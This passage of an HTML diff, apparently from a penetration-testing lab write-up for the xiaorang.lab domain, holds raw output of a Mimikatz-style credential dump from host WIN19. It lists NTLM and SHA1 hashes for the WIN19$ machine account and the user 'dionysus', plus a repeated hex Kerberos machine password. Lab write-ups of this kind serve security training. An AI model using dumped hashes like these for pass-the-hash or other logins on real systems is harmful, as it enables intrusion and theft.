+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">1127745</span> <span class="o">(</span>00000000:00113541<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-2
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 21:04:49
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-2
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">57812</span> <span class="o">(</span>00000000:0000e1d4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-1
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:30
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-1
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">996</span> <span class="o">(</span>00000000:000003e4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : WIN19$
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-20
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : win19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">28074</span> <span class="o">(</span>00000000:00006daa<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : UMFD-1
+</span></span><span class="line"><span class="cl">Domain            : Font Driver Host
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-96-0-1
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">28048</span> <span class="o">(</span>00000000:00006d90<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : UMFD-0
+</span></span><span class="line"><span class="cl">Domain            : Font Driver Host
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-96-0-0
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">26930</span> <span class="o">(</span>00000000:00006932<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : UndefinedLogonType from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Domain            : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:29
+</span></span><span class="line"><span class="cl">SID               :
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">3113864</span> <span class="o">(</span>00000000:002f8388<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : dionysus
+</span></span><span class="line"><span class="cl">Domain            : WIN19
+</span></span><span class="line"><span class="cl">Logon Server      : WIN19
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 22:15:47
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3980434786-725135618-2951588801-1004
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * NTLM     : 6912928308e3cda903e6d75bd6091a20
+</span></span><span class="line"><span class="cl">         * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">3105134</span> <span class="o">(</span>00000000:002f616e<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-3
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 22:15:47
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-3
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
